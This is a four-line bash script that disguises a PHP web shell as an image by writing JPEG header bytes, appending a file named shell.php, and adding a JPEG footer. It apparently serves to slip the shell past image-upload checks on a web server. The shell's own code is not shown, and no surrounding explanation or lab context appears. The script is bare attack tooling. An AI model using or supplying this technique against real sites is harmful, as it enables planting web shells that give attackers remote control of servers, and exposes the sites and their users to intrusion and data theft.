#!/bin/bash
echo -ne '\xFF\xD8\xFF\xE0' > shell.jpg # JPEG header
cat shell.php >> shell.jpg              # Append PHP shell
echo -ne '\xFF\xD9' >> shell.jpg        # JPEG footer
